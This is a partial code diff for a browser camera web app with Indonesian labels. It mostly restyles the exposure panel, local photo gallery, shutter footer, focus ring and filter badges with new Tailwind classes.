+                <input id="slider-sepia" type="range" min="0" max="100" value="0" class="w-full h-2 bg-black/60 rounded-lg appearance-none cursor-pointer accent-cyan-400 border border-cyan-500/30">
             </div>
         </div>
     </div>
 
     <!-- PRO TUNING DRAWER MODAL -->
-    <div id="pro-panel" class="absolute bottom-28 left-4 right-16 z-40 glass-panel rounded-3xl p-3.5 shadow-2xl hidden transition-all duration-300 max-h-[42vh] overflow-y-auto no-scrollbar">
-        <div class="flex items-center justify-between mb-2.5 pb-1.5 border-b border-white/20">
-            <span class="font-mono text-[10px] font-bold text-brand-accentCyan flex items-center gap-1.5 drop-shadow">
-                <i data-lucide="sliders" class="w-3.5 h-3.5"></i> MANUAL PRO EXPOSURE
+    <div id="pro-panel" class="absolute bottom-28 left-4 right-20 z-40 glass-panel rounded-3xl p-4 shadow-2xl hidden transition-all duration-300 max-h-[42vh] overflow-y-auto no-scrollbar border border-brand-accentCyan/30">
+        <div class="flex items-center justify-between mb-3 pb-2 border-b border-brand-accentCyan/20">
+            <span class="font-mono text-[11px] font-bold text-brand-accentCyan flex items-center gap-2 drop-shadow">
+                <i data-lucide="sliders" class="w-4 h-4"></i> MANUAL PRO EXPOSURE
             </span>
-            <button id="btn-close-pro" class="p-1 text-white hover:text-gray-200">
+            <button id="btn-close-pro" class="p-1.5 rounded-xl bg-white/5 hover:bg-white/10 text-white transition-all">
                 <i data-lucide="x" class="w-4 h-4"></i>
             </button>
         </div>
-        <div class="space-y-3">
+        <div class="space-y-3.5">
             <div>
-                <div class="flex justify-between text-[10px] font-mono text-white mb-0.5">
+                <div class="flex justify-between text-[10px] font-mono text-white mb-1">
                     <span>EXPOSURE (EV)</span>
                     <span id="ev-val-text" class="text-brand-accentCyan font-bold">0.0 EV</span>
                 </div>
-                <input id="slider-ev" type="range" min="-2" max="2" step="0.1" value="0" class="w-full h-1.5 bg-white/30 rounded-lg appearance-none cursor-pointer accent-brand-accentCyan">
+                <input id="slider-ev" type="range" min="-2" max="2" step="0.1" value="0" class="w-full h-2 bg-black/60 rounded-lg appearance-none cursor-pointer accent-brand-accentCyan border border-brand-accentCyan/30">
             </div>
         </div>
     </div>
 
     <!-- GALLERY MODAL DRAWER (INDEXEDDB PERSISTENT) -->
-    <div id="gallery-modal" class="absolute inset-0 z-50 bg-black/92 backdrop-blur-2xl p-4 flex flex-col hidden">
-        <div class="flex items-center justify-between pb-3 border-b border-white/15">
-            <h3 class="font-mono text-xs font-bold text-white flex items-center gap-2">
+    <div id="gallery-modal" class="absolute inset-0 z-50 bg-[#020205]/95 backdrop-blur-2xl p-6 flex flex-col hidden">
+        <div class="flex items-center justify-between pb-4 border-b border-brand-accentCyan/20">
+            <h3 class="font-mono text-xs font-bold text-white flex items-center gap-2.5">
                 <i data-lucide="image" class="w-4 h-4 text-brand-accentRed"></i> LOCAL GALLERY (INDEXEDDB)
             </h3>
-            <button id="btn-close-gallery" class="p-1 text-gray-300 hover:text-white">
+            <button id="btn-close-gallery" class="p-2 rounded-2xl bg-white/5 hover:bg-white/10 text-gray-300 hover:text-white transition-all">
                 <i data-lucide="x" class="w-5 h-5"></i>
             </button>
         </div>
-        <div id="gallery-grid-container" class="flex-1 grid grid-cols-2 sm:grid-cols-3 gap-3 p-2 overflow-y-auto no-scrollbar items-center justify-center">
+        <div id="gallery-grid-container" class="flex-1 grid grid-cols-2 sm:grid-cols-3 gap-4 p-3 overflow-y-auto no-scrollbar items-center justify-center">
             <span class="text-xs text-gray-400 font-mono col-span-full text-center">Memuat galeri...</span>
         </div>
-        <div class="pt-2 flex justify-between items-center px-2">
-            <button id="btn-clear-gallery" class="px-4 py-2 bg-red-500/20 text-red-400 border border-red-500/30 font-bold text-xs rounded-full hover:bg-red-500/30 transition-all">Hapus Semua</button>
-            <a id="gallery-download-btn" download="spectra_max_photo.jpg" href="#" class="px-5 py-2 bg-brand-accentCyan text-black font-bold text-xs rounded-full hidden flex items-center gap-2 shadow-lg">
+        <div class="pt-4 flex justify-between items-center px-2">
+            <button id="btn-clear-gallery" class="px-5 py-2.5 bg-red-500/20 text-red-400 border border-red-500/40 font-bold text-xs rounded-2xl hover:bg-red-500/30 transition-all shadow-[0_0_15px_rgba(239,68,68,0.2)]">Hapus Semua</button>
+            <a id="gallery-download-btn" download="spectra_max_photo.jpg" href="#" class="px-6 py-2.5 bg-gradient-to-r from-brand-accentCyan to-blue-500 text-black font-bold text-xs rounded-2xl hidden flex items-center gap-2 shadow-[0_0_20px_rgba(0,242,254,0.4)] hover:scale-105 transition-all">
                 <i data-lucide="download" class="w-4 h-4"></i> Unduh Terpilih
             </a>
         </div>
     </div>
 
     <!-- BOTTOM CAPTURE FOOTER -->
-    <footer class="z-30 bg-black/40 backdrop-blur-xl border-t border-white/15 pt-3 pb-4 flex flex-col space-y-2">
+    <footer class="z-30 bg-[#020205]/80 backdrop-blur-2xl border-t border-brand-accentCyan/20 pt-4 pb-6 flex flex-col space-y-3">
         <div class="flex items-center justify-between max-w-sm mx-auto w-full px-6">
-            <div id="gallery-thumb" class="w-12 h-12 rounded-2xl bg-white/10 border border-white/25 overflow-hidden flex items-center justify-center cursor-pointer active:scale-90 transition-all shadow-md">
+            <div id="gallery-thumb" class="w-14 h-14 rounded-2xl bg-white/5 border border-brand-accentCyan/30 overflow-hidden flex items-center justify-center cursor-pointer active:scale-90 transition-all shadow-[0_0_15px_rgba(0,242,254,0.15)] hover:border-brand-accentCyan">
                 <i data-lucide="image" class="w-5 h-5 text-gray-300"></i>
             </div>
             
-            <button id="btn-shutter" class="w-18 h-18 rounded-full border-4 border-white flex items-center justify-center p-1.5 hover:scale-105 active:scale-95 transition-all shadow-[0_0_25px_rgba(255,255,255,0.3)]">
-                <div class="w-full h-full rounded-full bg-brand-accentRed transition-all duration-200"></div>
+            <button id="btn-shutter" class="w-20 h-20 rounded-full border-4 border-brand-accentCyan/80 flex items-center justify-center p-2 hover:scale-105 active:scale-95 transition-all shadow-[0_0_35px_rgba(0,242,254,0.4)] bg-black/40">
+                <div class="w-full h-full rounded-full bg-gradient-to-tr from-brand-accentRed to-pink-500 transition-all duration-200 shadow-[inset_0_0_10px_rgba(255,255,255,0.5)]"></div>
             </button>
 
-            <button id="btn-quick-flip" class="w-12 h-12 rounded-2xl bg-white/10 border border-white/25 flex items-center justify-center text-white hover:bg-white/20 active:scale-90 transition-all shadow-md" title="Flip Kamera">
+            <button id="btn-quick-flip" class="w-14 h-14 rounded-2xl bg-white/5 border border-brand-accentCyan/30 flex items-center justify-center text-white hover:bg-white/10 hover:border-brand-accentCyan active:scale-90 transition-all shadow-[0_0_15px_rgba(0,242,254,0.15)]" title="Flip Kamera">
                 <i data-lucide="switch-camera" class="w-5 h-5 text-brand-accentCyan"></i>
             </button>
         </div>
@@ -424,7 +457,7 @@
                     let html = '';
                     photos.forEach((item) => {
                         html += `
-                            <div class="relative aspect-square rounded-xl overflow-hidden border border-white/20 cursor-pointer group gallery-item" data-url="${item.dataUrl}">
+                            <div class="relative aspect-square rounded-2xl overflow-hidden border border-brand-accentCyan/30 cursor-pointer group gallery-item shadow-md" data-url="${item.dataUrl}">
                                 <img src="${item.dataUrl}" class="w-full h-full object-cover group-hover:scale-105 transition-transform duration-300">
                             </div>
                         `;
@@ -436,8 +469,8 @@
                             const targetUrl = e.currentTarget.dataset.url;
                             galleryDownloadBtn.href = targetUrl;
                             galleryDownloadBtn.classList.remove('hidden');
-                            document.querySelectorAll('.gallery-item').forEach(i => i.classList.remove('border-brand-accentCyan', 'border-2'));
-                            e.currentTarget.classList.add('border-brand-accentCyan', 'border-2');
+                            document.querySelectorAll('.gallery-item').forEach(i => i.classList.remove('border-brand-accentCyan', 'border-2', 'shadow-[0_0_15px_#00f2fe]'));
+                            e.currentTarget.classList.add('border-brand-accentCyan', 'border-2', 'shadow-[0_0_15px_#00f2fe]');
                         });
                     });
                 });
@@ -510,7 +543,6 @@
                         const lat = position.coords.latitude.toFixed(4);
                         const lon = position.coords.longitude.toFixed(4);
                         
-                        // Reverse geocoding opsional via Nominatim OpenStreetMap (Gratis & Tanpa Key)
                         try {
                             const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
                             const data = await res.json();
@@ -828,8 +860,8 @@
                 const x = e.clientX - rect.left;
                 const y = e.clientY - rect.top;
 
-                focusRing.style.left = `${x - 32}px`;
-                focusRing.style.top = `${y - 32}px`;
+                focusRing.style.left = `${x - 40}px`;
+                focusRing.style.top = `${y - 40}px`;
                 focusRing.classList.remove('hidden', 'focus-ring-anim');
                 void focusRing.offsetWidth;
                 focusRing.classList.add('focus-ring-anim');
@@ -859,11 +891,11 @@
             document.querySelectorAll('.preset-badge').forEach(badge => {
                 badge.addEventListener('click', (e) => {
                     document.querySelectorAll('.preset-badge').forEach(b => {
-                        b.classList.remove('bg-white/25', 'border-brand-accentCyan');
-                        b.classList.add('bg-white/10', 'border-white/20');
+                        b.classList.remove('bg-brand-accentCyan/20', 'border-brand-accentCyan', 'shadow-[0_0_10px_rgba(0,242,254,0.3)]');
+                        b.classList.add('bg-white/5', 'border-white/15');
                     });
-                    e.currentTarget.classList.remove('bg-white/10', 'border-white/20');
-                    e.currentTarget.classList.add('bg-white/25', 'border', 'border-brand-accentCyan');
+                    e.currentTarget.classList.remove('bg-white/5', 'border-white/15');
+                    e.currentTarget.classList.add('bg-brand-accentCyan/20', 'border', 'border-brand-accentCyan', 'shadow-[0_0_10px_rgba(0,242,254,0.3)]');
                     activeFilter = e.currentTarget.dataset.filter;
                     applyCombinedFilters();
                 });
